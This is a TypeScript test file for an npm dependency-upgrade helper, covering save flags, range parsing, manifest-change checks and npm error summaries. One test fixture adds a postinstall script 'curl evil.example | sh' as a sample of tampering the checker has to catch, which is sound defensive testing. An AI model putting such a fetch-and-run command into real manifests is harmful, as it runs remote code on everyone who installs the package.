import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { checkManifestChange, describeInstallFailure, planSave, rangeIn } from './manifest.js';

describe('planSave', () => {
  it('keeps a caret range a caret range', () => {
    expect(planSave('^4.21.2', '5.3.0', 'dependencies')).toEqual({
      flags: ['--save-prod', '--save-exact=false', '--save-prefix=^'],
      newRange: '^5.3.0',
      note: null,
    });
  });

  it('keeps tilde ranges and exact versions as they were', () => {
    expect(planSave('~1.10.0', '1.10.1', 'dependencies').newRange).toBe('~1.10.1');
    expect(planSave('~1.10.0', '1.10.1', 'dependencies').flags).toContain('--save-prefix=~');
    expect(planSave('7.1.4', '7.2.0', 'devDependencies')).toEqual({
      flags: ['--save-dev', '--save-exact'],
      newRange: '7.2.0',
      note: null,
    });
  });

  it('keeps the dependency in its section', () => {
    expect(planSave('^1.0.0', '2.0.0', 'devDependencies').flags[0]).toBe('--save-dev');
    expect(planSave('^1.0.0', '2.0.0', 'optionalDependencies').flags[0]).toBe('--save-optional');
  });

  it('falls back to a caret range for other range styles, and says so', () => {
    const plan = planSave('>=1.2.0 <2', '2.0.0', 'dependencies');
    expect(plan.newRange).toBe('^2.0.0');
    expect(plan.note).toBe('the range ">=1.2.0 <2" is not ^, ~ or exact, so it becomes ^2.0.0');
  });
});

describe('rangeIn', () => {
  it('reads a range from the right section', () => {
    const text = '{"dependencies":{"express":"^4.21.2"},"devDependencies":{"mocha":"^12.0.3"}}';
    expect(rangeIn(text, 'express', 'dependencies')).toBe('^4.21.2');
    expect(rangeIn(text, 'express', 'devDependencies')).toBeNull();
    expect(rangeIn('not json', 'express', 'dependencies')).toBeNull();
  });
});

describe('checkManifestChange', () => {
  const before = JSON.stringify(
    {
      name: 'demo',
      scripts: { test: 'mocha' },
      dependencies: { morgan: '^1.10.0', express: '^4.21.2', cors: '^2.8.4' },
      devDependencies: { mocha: '^12.0.3' },
    },
    null,
    2,
  );
  const change = { name: 'express', type: 'dependencies' as const, newRange: '^5.3.0' };
  type Manifest = Record<'scripts' | 'dependencies' | 'devDependencies', Record<string, string>>;
  const edit = (mutate: (manifest: Manifest) => void) => {
    const manifest = JSON.parse(before);
    mutate(manifest);
    return JSON.stringify(manifest, null, 2);
  };

  it('accepts a change to that one range, even when npm re-sorts the keys', () => {
    const after = JSON.stringify(
      {
        name: 'demo',
        scripts: { test: 'mocha' },
        dependencies: { cors: '^2.8.4', express: '^5.3.0', morgan: '^1.10.0' },
        devDependencies: { mocha: '^12.0.3' },
      },
      null,
      4,
    );
    expect(checkManifestChange(before, after, change)).toEqual([]);
  });

  it('catches an install script that adds a script or a dependency', () => {
    const after = edit((manifest) => {
      manifest.dependencies.express = '^5.3.0';
      manifest.scripts.postinstall = 'curl evil.example | sh';
      manifest.dependencies['left-pad'] = '^1.3.0';
    });
    expect(checkManifestChange(before, after, change)).toEqual([
      'scripts.postinstall changed',
      'dependencies.left-pad changed',
    ]);
  });

  it('catches a wrong range or a dependency that moved section', () => {
    expect(
      checkManifestChange(
        before,
        edit((m) => {
          m.dependencies.express = '5.3.0';
        }),
        change,
      ),
    ).toEqual(['dependencies.express is "5.3.0", expected "^5.3.0"']);

    const moved = edit((manifest) => {
      delete manifest.dependencies.express;
      manifest.devDependencies.express = '^5.3.0';
    });
    expect(checkManifestChange(before, moved, change)).toEqual([
      'dependencies.express is missing, expected "^5.3.0"',
      'devDependencies.express changed',
    ]);
  });

  it('catches a file that is no longer JSON', () => {
    expect(checkManifestChange(before, 'oops', change)).toEqual([
      'package.json is no longer a JSON object',
    ]);
  });
});

describe('describeInstallFailure', () => {
  it('turns a real ERESOLVE into "upgrade them together"', () => {
    const stderr = readFileSync(
      new URL('../../tests/fixtures/npm/install-eresolve.stderr.txt', import.meta.url),
      'utf8',
    );
    expect(describeInstallFailure(stderr)).toBe(
      'needs a coordinated upgrade: react-dom@18.3.1 needs react@^18.3.1, but the project has ' +
        'react@17.0.2. Upgrade them together (npm ERESOLVE)',
    );
  });

  it('reports other npm errors with their code', () => {
    const stderr = [
      'npm error code ETARGET',
      'npm error notarget No matching version found for express@9.9.9.',
      'npm error A complete log of this run can be found in: /home/node/.npm/_logs/x.log',
    ].join('\n');
    expect(describeInstallFailure(stderr)).toBe(
      'npm install failed (ETARGET): notarget No matching version found for express@9.9.9.',
    );
  });
});
